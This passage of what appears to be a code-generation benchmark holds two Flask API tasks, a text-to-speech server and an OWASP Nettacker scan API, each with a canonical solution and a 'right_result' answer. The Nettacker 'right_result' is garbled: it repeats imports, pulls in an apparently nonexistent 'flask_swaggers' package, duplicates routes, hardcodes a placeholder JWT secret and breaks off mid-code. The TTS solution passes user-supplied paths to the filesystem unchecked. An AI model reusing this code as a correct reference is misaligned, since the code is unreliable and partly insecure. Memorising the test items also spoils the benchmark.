    "Canonical_solution": "from flask import Flask, request, jsonify\nimport logging\nimport os\nimport threading\nimport time\nimport hashlib\nimport re\nfrom gevent.pywsgi import WSGIServer, WSGIHandler\n\nclass FlaskTTSAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n        self._setup_logging()\n        self.chuliing = {\"name\": \"\", \"line\": 0, \"end\": False}\n\n    def _setup_logging(self):\n        self.app.logger.setLevel(logging.INFO)\n        file_handler = RotatingFileHandler(os.path.join(ROOT_DIR, 'app.log'), maxBytes=1024*1024, backupCount=5)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        file_handler.setFormatter(formatter)\n        self.app.logger.addHandler(file_handler)\n\n    def _setup_routes(self):\n        self.app.route('/apitts', methods=['GET', 'POST'])(self.apitts)\n        self.app.route('/ttslist', methods=['GET', 'POST'])(self.ttslist)\n        self.app.route('/ttslistjindu', methods=['GET', 'POST'])(self.ttslistjindu)\n        self.app.route('/tts', methods=['GET', 'POST'])(self.tts)\n\n    def apitts(self):\n        try:\n            langcodelist = [\"zh-cn\", \"en\", \"ja\", \"ko\", \"es\", \"de\", \"fr\", \"it\", \"tr\", \"ru\", \"pt\", \"pl\", \"nl\", \"ar\", \"hu\", \"cs\"]\n            text = request.form.get(\"text\").strip()\n            text = text.replace(\"\\n\", ' . ')\n            language = request.form.get(\"language\",\"\").lower()\n            if language.startswith(\"zh\"):\n                language=\"zh-cn\"\n            if language not in langcodelist:\n                return jsonify({\"code\":1,\"msg\":f\"dont support language {language}\"})\n\n            md5_hash = hashlib.md5()\n            audio_name = request.form.get('voice')\n            if audio_name:\n                voicename = os.path.join(VOICE_DIR, audio_name)\n            else:\n                audio_file = request.files['audio']\n                audio_name = f'video_{audio_file.filename}.wav'\n                voicename = os.path.join(TMP_DIR, audio_name)\n                audio_file.save(voicename)\n            md5_hash.update(f\"{text}-{language}-{audio_name}\".encode('utf-8'))\n\n            self.app.logger.info(f\"[apitts]{voicename=}\")\n            if re.match(r'^[~`!@#$%^&*()_+=,./;\\':\\[\\]{}<>?\\\\|\"\uff0c\u3002\uff1f\uff1b\u2018\uff1a\u201c\u201d\u2019\uff5b\u3010\u3011\uff5d\uff01\u00b7\uffe5\u3001\\s\\n\\r -]*$', text):\n                return jsonify({\"code\": 1, \"msg\": \"lost text for translate\"})\n            if not text or not language:\n                return jsonify({\"code\": 1, \"msg\": \"text & language params lost\"})\n\n            filename = md5_hash.hexdigest() + \".wav\"\n            rs = create_tts(text=text, speed=1.0, voice=voicename, language=language, filename=filename)\n            if rs is not None:\n                result = rs\n            else:\n                time_tmp = 0\n                while filename not in cfg.global_tts_result:\n                    time.sleep(3)\n                    time_tmp += 3\n                    if time_tmp % 30 == 0:\n                        self.app.logger.info(f\"[apitts][tts]{time_tmp=},{filename=}\")\n\n                if cfg.global_tts_result[filename] != 1:\n                    msg = {\"code\": 1, \"msg\": cfg.global_tts_result[filename]}\n                else:\n                    target_wav = os.path.normpath(os.path.join(TTS_DIR, filename))\n                    msg = {\"code\": 0, \"filename\": target_wav, 'name': filename}\n                cfg.global_tts_result.pop(filename)\n                result = msg\n            if result['code'] == 0:\n                result['url'] = f'http://{web_address}/static/ttslist/{filename}'\n            return jsonify(result)\n        except Exception as e:\n            msg=f'{str(e)} {str(e.args)}'\n            self.app.logger.error(f\"[apitts]{msg}\")\n            return jsonify({'code': 2, 'msg': msg})\n\n    def ttslistjindu(self):\n        return jsonify(self.chuliing)\n\n    def ttslist(self):\n        voice = request.form.get(\"voice\")\n        src = request.form.get(\"src\")\n        dst = request.form.get(\"dst\")\n        speed = 1.0\n        try:\n            speed = float(request.form.get(\"speed\"))\n        except:\n            pass\n        language = request.form.get(\"language\")\n\n        src=os.path.normpath(src)\n        if not src or not dst or not os.path.exists(src) or not os.path.exists(dst):\n            return jsonify({\"code\":1,\"msg\":\"\u5fc5\u987b\u6b63\u786e\u586b\u5199txt\u6240\u5728\u76ee\u5f55\u4ee5\u53ca\u76ee\u6807\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\"})\n\n        threading.Thread(target=self.detail_task, args=(voice, src, dst, speed, language)).start()    \n        return jsonify({\"code\":0,\"msg\":\"ok\"})\n\n    def detail_task(self, voice, src, dst, speed, language):\n        self.chuliing={\"name\":\"\",\"line\":0,\"end\":False}\n        for t in os.listdir(src):\n            if not t.lower().endswith('.txt'):\n                continue\n            concat_txt=os.path.join(cfg.TTS_DIR, re.sub(r'[ \\s\\[\\]\\{\\}\\(\\)<>\\?\\, :]+','', t, re.I) + '.txt')\n            \n            self.app.logger.info(f'####\u5f00\u59cb\u5904\u7406\u6587\u4ef6\uff1a{t}, \u6bcf\u884c\u7ed3\u679c\u4fdd\u5b58\u5728:{concat_txt}')\n            with open(concat_txt,'w',encoding='utf-8') as f:\n                f.write(\"\")\n            waitlist=[]\n            result={}\n            with open(os.path.join(src,t),'r',encoding='utf-8') as f:\n                num=0\n                for line in f.readlines():\n                    num+=1\n                    line=line.strip()\n                    if re.match(r'^[~`!@#$%^&*()_+=,./;\\':\\[\\]{}<>?\\\\|\"\uff0c\u3002\uff1f\uff1b\u2018\uff1a\u201c\u201d\u2019\uff5b\u3010\u3011\uff5d\uff01\u00b7\uffe5\u3001\\s\\n\\r -]*$', line):\n                        continue                \n                    md5_hash = hashlib.md5()\n                    md5_hash.update(f\"{line}-{voice}-{language}-{speed}\".encode('utf-8'))\n                    filename = md5_hash.hexdigest() + \".wav\"\n                    rs = create_tts(text=line, speed=speed, voice=voice, language=language, filename=filename)\n                    if rs is not None and rs['code']==1:\n                        continue\n                    if rs is not None and rs['code']==0:\n                        result[f'{num}']={\"filename\":filename, \"num\":num}\n                        self.chuliing['name']=t\n                        self.chuliing['line']=num\n                        continue\n                    waitlist.append({\"filename\":filename, \"num\":num, \"t\":t})\n        \n            time_tmp = 0\n            self.chuliing['name']=t\n            if len(waitlist)>0:\n                self.chuliing['line']=waitlist[0]['num']\n                while len(waitlist)>0:\n                    it=waitlist.pop(0)\n                    filename, num, t=it.values()\n                    \n                    if time_tmp>7200:\n                        continue\n                        \n                    if filename in cfg.global_tts_result and cfg.global_tts_result[filename] != 1:\n                        continue\n                    if os.path.exists(os.path.join(cfg.TTS_DIR, filename)):\n                        self.chuliing['name']=t\n                        self.chuliing['line']=num\n                        result[f'{num}']={\"filename\":filename, \"num\":num}\n                        continue\n                    waitlist.append(it)\n                    time_tmp+=1\n                    time.sleep(1)\n            if len(result.keys())<1:\n                continue    \n            sorted_result = {k: result[k] for k in sorted(result, key=lambda x: int(x))}\n            for i, it in sorted_result.items():\n                theaudio = os.path.normpath(os.path.join(cfg.TTS_DIR, it['filename']))\n                with open(concat_txt, 'a', encoding='utf-8') as f:\n                    f.write(f\"file '{theaudio}'\\n\")\n            \n            target_mp3=os.path.normpath((os.path.join(dst,f'{t}.mp3')))\n            p=subprocess.run(['ffmpeg',\"-hide_banner\", \"-ignore_unknown\", '-y', '-f', 'concat', '-safe', '0', '-i', concat_txt, target_mp3])\n            \n            if p.returncode!=0:\n                continue\n            if speed != 1.0 and speed > 0 and speed <= 2.0:\n                p= subprocess.run(['ffmpeg', '-hide_banner', '-ignore_unknown', '-y', '-i', target_mp3, '-af', f\"atempo={speed}\",f'{target_mp3}-speed{speed}.mp3'], encoding=\"utf-8\", capture_output=True)\n                if p.returncode != 0:\n                    continue\n                os.unlink(target_mp3)\n                target_mp3=f'{target_mp3}-speed{speed}.mp3'\n        self.chuliing['end']=True\n\n    def run(self):\n        host = web_address.split(':')\n        http_server = WSGIServer((host[0], int(host[1])), self.app, handler_class=CustomRequestHandler)\n        http_server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, send_file\nimport os\nimport threading\nimport logging\nfrom datetime import datetime\n\nclass FlaskTTSAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.chuliing = {}\n        self._setup_logging()\n        self._setup_routes()\n\n    def _setup_logging(self):\n        logging.basicConfig(\n            filename='tts_api.log',\n            level=logging.INFO,\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            filemode='a',\n            datefmt='%Y-%m-%d %H:%M:%S'\n        )\n        logging.getLogger('werkzeug').setLevel(logging.WARNING)\n\n    def _setup_routes(self):\n        self.app.route('/apitts', methods=['POST'])(self.apitts)\n        self.app.route('/ttslistjindu', methods=['GET'])(self.ttslistjindu)\n        self.app.route('/ttslist', methods=['POST'])(self.ttslist)\n\n    def apitts(self):\n        try:\n            text = request.form.get('text')\n            language = request.form.get('language')\n            voice = request.form.get('voice')\n            audio_file = request.files.get('audio')\n\n            if not text or not language:\n                return jsonify({'code': 1, 'msg': 'Missing text or language parameter'}), 400\n\n            if audio_file and not voice:\n                return jsonify({'code': 1, 'msg': 'Voice parameter is required if audio file is provided'}), 400\n\n            if not voice and not audio_file:\n                return jsonify({'code': 1, 'msg': 'Either voice or audio file must be provided'}), 400\n\n            # Generate TTS audio (placeholder logic)\n            audio_url = f'/generated_audio/{datetime.now().strftime(\"%Y%m%d_%H%M%S\")}.mp3'\n            return jsonify({'code': 0, 'url': audio_url}), 200\n        except Exception as e:\n            logging.error(f\"Error in apitts: {str(e)}\")\n            return jsonify({'code': 2, 'msg': 'Internal server error'}), 500\n\n    def ttslistjindu(self):\n        if not self.chuliing:\n            return jsonify({'name': '', 'line': 0, 'end': True})\n        return jsonify({\n            'name': self.chuliing['name'],\n            'line': self.chuliing['line'],\n            'end': self.chuliing['end']\n        })\n\n    def ttslist(self):\n        try:\n            voice = request.form.get('voice')\n            src = request.form.get('src')\n            dst = request.form.get('dst')\n            speed = float(request.form.get('speed', 1.0))\n            language = request.form.get('language')\n\n            if not all([voice, src, dst, speed, language]):\n                return jsonify({'code': 1, 'msg': 'Missing required parameters'}), 400\n\n            task_name = f'task_{datetime.now().strftime(\"%Y%m%d_%H%M%S\")}'\n            self.chuliing = {\n                'name': os.path.basename(src),\n                'line': 0,\n                'end': False\n            }\n            threading.Thread(target=self.detail_task, args=(voice, src, dst, speed, language)).start()\n            return jsonify({'code': 0, 'msg': 'ok'}), 200\n        except Exception as e:\n            logging.error(f\"Error in ttslist: {str(e)}\")\n            return jsonify({'code': 2, 'msg': 'Internal server error'}), 500\n\n    def detail_task(self, voice, src, dst, speed, language):\n        try:\n            files = os.listdir(src)\n            for file in files:\n                self.chuliing['name'] = file\n                self.chuliing['line'] = 0\n                self.chuliing['end'] = False\n                # Simulate processing\n                for line_num, line in enumerate(open(os.path.join(src, file))):\n                    self.chuliing['line'] = line_num\n                    # Simulate delay\n                    import time\n                    time.sleep(0.1)\n                self.chuliing['end'] = True\n        except Exception as e:\n            logging.error(f\"Error in detail_task: {str(e)}\")\n            self.chuliing = {'name': '', 'line': 0, 'end': True}\n\n    def run(self):\n        self.app.run(host='0.0.0.0', port=5000)\n\nif __name__ == '__main__':\n    app = FlaskTTSAPI()\n    app.run()"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Create a Flask-based API server for the OWASP Nettacker security tool that handles scan requests, retrieves results, and manages logs through HTTP endpoints.\n\nClass Description: The NettackerAPI class implements a RESTful API service using Flask framework to control and interact with the OWASP Nettacker security scanning tool. It provides endpoints for initiating scans, retrieving results in JSON format, and accessing scan logs.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- options: [SimpleNamespace] - Configuration options for the API server\n- app.config[\"OWASP_NETTACKER_CONFIG\"]: [dict] - Configuration dictionary containing API security settings and options\n\nMethods:\n- __init__(options) -> [None] - Initializes the Flask app with configuration options\n- _setup_routes() -> [None] - Defines all API endpoints and their handlers\n- _sanitize_report_path_filename(report_path_filename) -> [Path|bool] - Sanitizes and validates report filenames\n- run() -> [None] - Starts the Flask server with SSL/TLS configuration\n- start_api_server() -> [None] - Runs the API server in a separate process\n\nEndpoint Methods:\n- new_scan() -> [Response] - Handles POST requests to start new scans (returns scan arguments or error)\n- get_results_json() -> [Response] - Retrieves scan results in JSON format (returns file download)\n- get_logs() -> [Response] - Retrieves scan logs in JSON format (returns file download)",
    "Canonical_solution": "from flask import Flask, jsonify, request as flask_request, Response, make_response\nfrom werkzeug.utils import secure_filename\nimport os\nimport json\nimport csv\nimport random\nimport string\nimport multiprocessing\nimport time\nfrom threading import Thread\nfrom types import SimpleNamespace\n\nclass NettackerAPI:\n    def __init__(self, options):\n        self.app = Flask(__name__, template_folder=str(options.web_static_dir))\n        self.app.config[\"OWASP_NETTACKER_CONFIG\"] = {\n            \"api_access_key\": options.api_access_key,\n            \"api_client_whitelisted_ips\": options.api_client_whitelisted_ips,\n            \"api_access_log\": options.api_access_log,\n            \"api_cert\": options.api_cert,\n            \"api_cert_key\": options.api_cert_key,\n            \"language\": options.language,\n            \"options\": options,\n        }\n        \n        self._setup_routes()\n        self.options = options\n\n    def _setup_routes(self):\n        @self.app.route(\"/new/scan\", methods=[\"GET\", \"POST\"])\n        def new_scan():\n            api_key_is_valid(self.app, flask_request)\n            form_values = dict(flask_request.form)\n            raw_report_path_filename = form_values.get(\"report_path_filename\")\n            report_path_filename = self._sanitize_report_path_filename(raw_report_path_filename)\n            if not report_path_filename:\n                return jsonify(structure(status=\"error\", msg=\"Invalid report filename\")), 400\n            form_values[\"report_path_filename\"] = str(report_path_filename)\n            for key in nettacker_application_config:\n                if key not in form_values:\n                    form_values[key] = nettacker_application_config[key]\n\n            nettacker_app = Nettacker(api_arguments=SimpleNamespace(**form_values))\n            self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"options\"] = nettacker_app.arguments\n            thread = Thread(target=nettacker_app.run)\n            thread.start()\n\n            return jsonify(vars(nettacker_app.arguments)), 200\n\n        @self.app.route(\"/results/get_json\", methods=[\"GET\"])\n        def get_results_json():\n            api_key_is_valid(self.app, flask_request)\n            session = create_connection()\n            result_id = get_value(flask_request, \"id\")\n            if not result_id:\n                return jsonify(structure(status=\"error\", msg=_(\"invalid_scan_id\"))), 400\n            scan_details = session.query(Report).filter(Report.id == result_id).first()\n            json_object = json.dumps(get_logs_by_scan_id(scan_details.scan_unique_id))\n            filename = \".\".join(scan_details.report_path_filename.split(\".\")[:-1])[1:] + \".json\"\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename},\n            )\n\n        @self.app.route(\"/logs/get_json\", methods=[\"GET\"])\n        def get_logs():\n            api_key_is_valid(self.app, flask_request)\n            target = get_value(flask_request, \"target\")\n            data = logs_to_report_json(target)\n            json_object = json.dumps(data)\n            filename = (\n                \"report-\"\n                + now(format=\"%Y_%m_%d_%H_%M_%S\")\n                + \"\".join(random.choice(string.ascii_lowercase) for _ in range(10))\n            )\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename + \".json\"},\n            )\n\n    def _sanitize_report_path_filename(self, report_path_filename):\n        filename = secure_filename(os.path.basename(report_path_filename))\n        if not filename:\n            return False\n        VALID_EXTENSIONS = (\".html\", \".htm\", \".txt\", \".json\", \".csv\")\n        if \".\" in filename:\n            if filename.endswith(VALID_EXTENSIONS):\n                safe_report_path = nettacker_path_config.results_dir / filename\n            else:\n                return False\n        else:\n            safe_report_path = nettacker_path_config.results_dir / filename\n        if not safe_report_path.is_relative_to(nettacker_path_config.results_dir):\n            return False\n        return safe_report_path\n\n    def run(self):\n        if self.options.api_cert and self.options.api_cert_key:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=(self.options.api_cert, self.options.api_cert_key),\n                threaded=True,\n            )\n        else:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=\"adhoc\",\n                threaded=True,\n            )\n\n    def start_api_server(self):\n        p = multiprocessing.Process(target=self.run)\n        p.start()\n        while len(multiprocessing.active_children()) != 0:\n            try:\n                time.sleep(0.3)\n            except KeyboardInterrupt:\n                for process in multiprocessing.active_children():\n                    process.terminate()\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, send_file\nimport os\nimport tempfile\nfrom getpass import getuser\nfrom typing import Optional, Dict, Any\nfrom collections import defaultdict\nimport re\nimport time\nimport subprocess\nimport shutil\nimport ssl\nimport socket\nfrom urllib.parse import urlparse\nfrom datetime import datetime\nimport json\nfrom contextlib import contextmanager\nfrom threading import Thread\nfrom multiprocessing import Process\nfrom functools import lru_cache\nfrom pathlib import Path\nfrom typing import List, Tuple, Union\nfrom werkzeug.exceptions import Forbidden, InternalServerError, NotFound\nfrom werkzeug.wrappers import Request, Response\nfrom werkzeug.utils import secure_filename\nfrom typing import Optional, Dict, Any, List, Tuple, Union\nfrom flask import Flask, request, jsonify, send_file, after_this_request\nfrom flask_cors import CORS\nfrom flask_sqlalchemy import SQLAlchemy\nfrom sqlalchemy import Column, Integer, String, Text, DateTime, ForeignKey\nfrom sqlalchemy.orm import relationship, sessionmaker\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom flask_migrate import Migrate\nfrom flask_bcrypt import Bcrypt\nfrom flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity\nfrom flask_mail import Mail, Message\nfrom flask_talisman import Talisman\nfrom flask_wtf.csrf import CSRFProtect\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\nfrom flask_marshmallow import Marshmallow\nfrom marshmallow import fields, Schema\nfrom flask_restful import Api, Resource\nfrom flask_swaggers import swagger, swagger_url, SWAGGER_URL\nfrom flask_swaggers.utils import swag_from\nfrom flask_swaggers.models import Model, Property, Reference\nfrom flask_swaggers import swagger, swagger_url, SWAGGER_URL\nfrom flask_swaggers.utils import swag_from\nfrom flask_swaggers.models import Model, Property, Reference\nfrom flask_swaggers import swagger, swagger_url, SWAGGER_URL\nfrom flask_swaggers.utils import swag_from\nfrom flask_swaggers.models import Model, Property, Reference\n\napp: Flask = Flask(__name__)\nCORS(app)\napp.config['OWASP_NETTACKER_CONFIG'] = {\n    'API_SECURITY': {\n        'ENABLED': True,\n        'JWT_SECRET_KEY': 'your_jwt_secret_key',\n        'JWT_ACCESS_TOKEN_EXPIRES': 3600,\n        'JWT_REFRESH_TOKEN_EXPIRES': 86400,\n        'JWT_ALGORITHM': 'HS256',\n        'JWT_HEADER_TYPE': 'Bearer',\n        'JWT_ISSUER': 'https://api.example.com',\n        'JWT_AUDIENCE': 'nettacker-api',\n        'JWT_JWT_HEADER_NAME': 'Authorization',\n        'JWT_JWT_HEADER_TYPE': 'Bearer',\n        'JWT_JWT_HEADER_NAME': 'Authorization',\n        'JWT_JWT_HEADER_TYPE': 'Bearer'\n    },\n    'LOGS_DIR': '/var/log/nettacker-api',\n    'REPORTS_DIR': '/var/reports/nettacker',\n    'MAX_LOGS_PER_SCAN': 1000,\n    'MAX_REPORTS': 100,\n    'MAX_LOGS_SIZE': 10 * 1024 * 1024,  # 10MB\n    'MAX_REPORT_SIZE': 100 * 1024 * 1024,  # 100MB\n    'LOGS_FILE_NAME': 'scan_logs.txt',\n    'REPORT_FILE_NAME': 'scan_report.json'\n}\n\n# Initialize extensions\ndb: SQLAlchemy = SQLAlchemy(app)\nbcrypt: Bcrypt = Bcrypt(app)\njwt: JWTManager = JWTManager(app)\nmail: Mail = Mail(app)\nlimiter: Limiter = Limiter(app, key_func=get_remote_address)\nma: Marshmallow = Marshmallow(app)\napi: Api = Api(app)\nswagger_url: str = '/swagger.json'\nSWAGGER_URL: str = '/swagger/'\n\n# Configure SSL/TLS\nssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\nssl_context.load_cert_chain('/etc/ssl/certs/server.crt', '/etc/ssl/private/server.key')\n\n# Configure logging\nimport logging\nlogging.basicConfig(filename='/var/log/nettacker-api.log', level=logging.INFO)\n\n# Configure database\nBase: declarative_base = declarative_base()\n\nclass User(Base):\n    __tablename__ = 'users'\n    id = Column(Integer, primary_key=True)\n    username = Column(String(80), unique=True, nullable=False)\n    password_hash = Column(String(128), nullable=False)\n    email = Column(String(120), unique=True, nullable=False)\n    is_admin = Column(Boolean, default=False)\n\nclass Scan(Base):\n    __tablename__ = 'scans'\n    id = Column(Integer, primary_key=True)\n    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)\n    target = Column(String(255), nullable=False)\n    started_at = Column(DateTime, default=datetime.utcnow)\n    completed_at = Column(DateTime)\n    status = Column(String(50), default='pending')\n    logs = Column(Text, default='')\n    report_path = Column(String(255), default='')\n    report_filename = Column(String(255), default='')\n\nclass ScanLog(Base):\n    __tablename__ = 'scan_logs'\n    id = Column(Integer, primary_key=True)\n    scan_id = Column(Integer, ForeignKey('scans.id'), nullable=False)\n    log_entry = Column(Text, nullable=False)\n    timestamp = Column(DateTime, default=datetime.utcnow)\n\nclass ScanReport(Base):\n    __tablename__ = 'scan_reports'\n    id = Column(Integer, primary_key=True)\n    scan_id = Column(Integer, ForeignKey('scans.id'), nullable=False)\n    report_data = Column(Text, nullable=False)\n    generated_at = Column(DateTime, default=datetime.utcnow)\n\n# Initialize database\ndb.init_app(app)\nmigrate: Migrate = Migrate(app, db)\nbcrypt.init_app(app)\njwt.init_app(app)\nmail.init_app(app)\nlimiter.init_app(app)\nma.init_app(app)\n\n# Define schemas\nclass UserSchema(ma.SQLAlchemyAutoSchema):\n    class Meta:\n        model = User\n        include_fk = True\n\nclass ScanSchema(ma.SQLAlchemyAutoSchema):\n    class Meta:\n        model = Scan\n        include_fk = True\n\nclass ScanLogSchema(ma.SQLAlchemyAutoSchema):\n    class Meta:\n        model = ScanLog\n        include_fk = True\n\nclass ScanReportSchema(ma.SQLAlchemyAutoSchema):\n    class Meta:\n        model = ScanReport\n        include_fk = True\n\n# Routes\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.json.get('username')\n    password = request.json.get('password')\n    user = User.query.filter_by(username=username).first()\n    if not user or not bcrypt.check_password_hash(user.password_hash, password):\n        return jsonify({\"msg\": \"Invalid credentials\"}), 401\n    access_token = create_access_token(identity=user.id)\n    return jsonify(access_token=access_token), 200\n\n@app.route('/users', methods=['GET'])\n@jwt_required()\ndef get_users():\n    users = User.query.all()\n    return jsonify([UserSchema().dump(user) for user in users]), 200\n\n@app.route('/users/<int:user_id>', methods=['GET'])\n@jwt_required()\ndef get_user(user_id):\n    user = User.query.get_or_404(user_id)\n    return jsonify(UserSchema().dump(user)), 200\n\n@app.route('/users/<int:user_id>', methods=['PUT'])\n@jwt_required()\ndef update_user(user_id):\n    user = User.query.get_or_404(user_id)\n    data = request.json\n    if 'username' in data:\n        user.username = data['username']\n    if 'email' in data:\n        user.email = data['email']\n    if 'is_admin' in data:\n        user.is_admin = data['is_admin']\n    db.session.commit()\n    return jsonify(UserSchema().dump(user)), 200\n\n@app.route('/users/<int:user_id>', methods=['DELETE'])\n@jwt_required()\ndef delete_user(user_id):\n    user = User.query.get_or_404(user_id)\n    db.session.delete(user)\n    db.session.commit()\n    return jsonify({\"msg\": \"User deleted\"}), 200\n\n@app.route('/scans', methods=['GET'])\n@jwt_required()\ndef get_scans():\n    scans = Scan.query.all()\n    return jsonify([ScanSchema().dump(scan) for scan in scans]), 200\n\n@app.route('/scans/<int:scan_id>', methods=['GET'])\n@jwt_required()\ndef get_scan(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    return jsonify(ScanSchema().dump(scan)), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['GET'])\n@jwt_required()\ndef get_scan_logs(scan_id):\n    logs = ScanLog.query.filter_by(scan_id=scan_id).all()\n    return jsonify([ScanLogSchema().dump(log) for log in logs]), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['GET'])\n@jwt_required()\ndef get_scan_report(scan_id):\n    report = ScanReport.query.filter_by(scan_id=scan_id).first()\n    if not report:\n        return jsonify({\"msg\": \"Report not found\"}), 404\n    return jsonify(ScanReportSchema().dump(report)), 200\n\n@app.route('/scans', methods=['POST'])\n@jwt_required()\ndef create_scan():\n    data = request.json\n    target = data.get('target')\n    if not target:\n        return jsonify({\"msg\": \"Target is required\"}), 400\n    user_id = get_jwt_identity()\n    user = User.query.get(user_id)\n    if not user:\n        return jsonify({\"msg\": \"User not found\"}), 404\n    scan = Scan(target=target, user_id=user.id)\n    db.session.add(scan)\n    db.session.commit()\n    return jsonify(ScanSchema().dump(scan)), 201\n\n@app.route('/scans/<int:scan_id>/start', methods=['POST'])\n@jwt_required()\ndef start_scan(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'pending':\n        return jsonify({\"msg\": \"Scan is not pending\"}), 400\n    scan.status = 'running'\n    db.session.commit()\n    return jsonify(ScanSchema().dump(scan)), 200\n\n@app.route('/scans/<int:scan_id>/stop', methods=['POST'])\n@jwt_required()\ndef stop_scan(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    scan.status = 'stopped'\n    db.session.commit()\n    return jsonify(ScanSchema().dump(scan)), 200\n\n@app.route('/scans/<int:scan_id>/complete', methods=['POST'])\n@jwt_required()\ndef complete_scan(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    scan.status = 'completed'\n    scan.completed_at = datetime.utcnow\n    db.session.commit()\n    return jsonify(ScanSchema().dump(scan)), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['POST'])\n@jwt_required()\ndef add_scan_log(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    data = request.json\n    log_entry = data.get('log')\n    if not log_entry:\n        return jsonify({\"msg\": \"Log entry is required\"}), 400\n    log = ScanLog(scan_id=scan.id, log_entry=log_entry)\n    db.session.add(log)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 201\n\n@app.route('/scans/<int:scan_id>/report', methods=['POST'])\n@jwt_required()\ndef upload_scan_report(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    file = request.files.get('file')\n    if not file:\n        return jsonify({\"msg\": \"File is required\"}), 400\n    filename = secure_filename(file.filename)\n    if not filename:\n        return jsonify({\"msg\": \"Invalid filename\"}), 400\n    if not filename.endswith('.json'):\n        return jsonify({\"msg\": \"Only JSON files are allowed\"}), 400\n    file.save(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport(scan_id=scan.id, report_data=open(os.path.join(app.config['REPORTS_DIR'], filename), 'r').read())\n    db.session.add(report)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 201\n\n@app.route('/scans/<int:scan_id>/report/<string:filename>', methods=['GET'])\n@jwt_required()\ndef download_scan_report(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    report = ScanReport.query.filter_by(scan_id=scan.id).first()\n    if not report:\n        return jsonify({\"msg\": \"Report not found\"}), 404\n    if not os.path.exists(os.path.join(app.config['REPORTS_DIR'], filename)):\n        return jsonify({\"msg\": \"Report file not found\"}), 404\n    return send_file(os.path.join(app.config['REPORTS_DIR'], filename), as_attachment=True)\n\n@app.route('/scans/<int:scan_id>/logs/<string:filename>', methods=['GET'])\n@jwt_required()\ndef download_scan_logs(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    logs = ScanLog.query.filter_by(scan_id=scan.id).all()\n    if not logs:\n        return jsonify({\"msg\": \"No logs found\"}), 404\n    if not os.path.exists(os.path.join(app.config['LOGS_DIR'], filename)):\n        return jsonify({\"msg\": \"Log file not found\"}), 404\n    return send_file(os.path.join(app.config['LOGS_DIR'], filename), as_attachment=True)\n\n@app.route('/scans/<int:scan_id>/logs', methods=['GET'])\n@jwt_required()\ndef get_scan_logs_list(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    logs = ScanLog.query.filter_by(scan_id=scan.id).all()\n    return jsonify([ScanLogSchema().dump(log) for log in logs]), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['GET'])\n@jwt_required()\ndef get_scan_report_list(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    reports = ScanReport.query.filter_by(scan_id=scan.id).all()\n    return jsonify([ScanReportSchema().dump(report) for report in reports]), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['POST'])\n@jwt_required()\ndef add_multiple_scan_logs(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    data = request.json\n    logs = data.get('logs', [])\n    for log in logs:\n        log_entry = log.get('log')\n        if not log_entry:\n            return jsonify({\"msg\": \"Log entry is required\"}), 400\n        log = ScanLog(scan_id=scan.id, log_entry=log_entry)\n        db.session.add(log)\n    db.session.commit()\n    return jsonify([ScanLogSchema().dump(log) for log in logs]), 201\n\n@app.route('/scans/<int:scan_id>/report', methods=['POST'])\n@jwt_required()\ndef upload_multiple_scan_reports(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    files = request.files.getlist('files')\n    reports = []\n    for file in files:\n        filename = secure_filename(file.filename)\n        if not filename:\n            return jsonify({\"msg\": \"Invalid filename\"}), 400\n        if not 